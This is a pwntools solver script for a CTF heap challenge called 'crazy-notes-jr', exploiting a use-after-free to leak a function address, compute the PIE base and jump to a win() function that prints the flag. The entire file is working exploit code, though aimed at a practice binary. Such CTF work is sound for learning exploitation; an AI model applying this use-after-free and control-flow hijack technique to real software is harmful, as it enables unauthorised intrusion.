#!/usr/bin/env python3
# solve.py — crazy-notes-jr solver
# Usage: python3 solve.py [REMOTE_HOST REMOTE_PORT]
#
# Attack chain:
# 1. Create note[0]  → malloc(0x20)
# 2. Delete note[0]  → free(chunk), notes[0] NOT cleared (UAF)
# 3. Secret (opt 6)  → malloc(0x20) returns SAME chunk, writes &win there
# 4. Show note[0]    → UAF: reads first 8 bytes → leaks win addr → PIE base
# 5. Jump (opt 4)    → call win() → system("cat flag.txt")

from pwn import *

exe = ELF('/home/student/ctfs/hackon_ctf/pwn/crazy-notes-jr/files/chall', checksec=False)
context.binary = exe
context.log_level = 'info'

def start(host=None, port=None):
    if host:
        return remote(host, port)
    return process(exe.path)

def menu(io):
    io.recvuntil(b'Exit\n')

def create(io, idx, data):
    menu(io)
    io.sendline(b'1')
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Data: ')
    io.sendline(data)
    io.recvuntil(b'Note created')

def show(io, idx):
    menu(io)
    io.sendline(b'2')
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Data: ')
    leak = io.recvline().strip()
    return int(leak, 16)

def delete(io, idx):
    menu(io)
    io.sendline(b'3')
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Note deleted')

def secret(io):
    menu(io)
    io.sendline(b'6')

def jump(io, addr):
    menu(io)
    io.sendline(b'4')
    io.recvuntil(b'Address: ')
    io.sendline(hex(addr).encode())
    io.recvuntil(b'Jumping...')

import sys
if len(sys.argv) == 3:
    io = start(sys.argv[1], int(sys.argv[2]))
else:
    io = start()

# Step 1: Create note[0]
create(io, 0, b'AAAAAAAAAAAAAAAA')
log.info("Created note 0")

# Step 2: Delete note[0] — UAF, pointer stays in notes[0]
delete(io, 0)
log.info("Deleted note 0 (UAF)")

# Step 3: Secret (option 6) — reallocates the same 0x20 chunk, writes &win into first 8 bytes
secret(io)
log.info("Called secret() — win addr written to recycled chunk")

# Step 4: Show note[0] — UAF read leaks the win address
win_leak = show(io, 0)
win_offset = 0x11b9
pie_base = win_leak - win_offset
log.success(f"Leaked win @ {hex(win_leak)}")
log.success(f"PIE base @ {hex(pie_base)}")

# Step 5: Jump to win()
win_addr = pie_base + win_offset
log.info(f"Jumping to win @ {hex(win_addr)}")
jump(io, win_addr)

# Get flag
try:
    flag = io.recvall(timeout=5)
    print(flag.decode())
except:
    io.interactive()
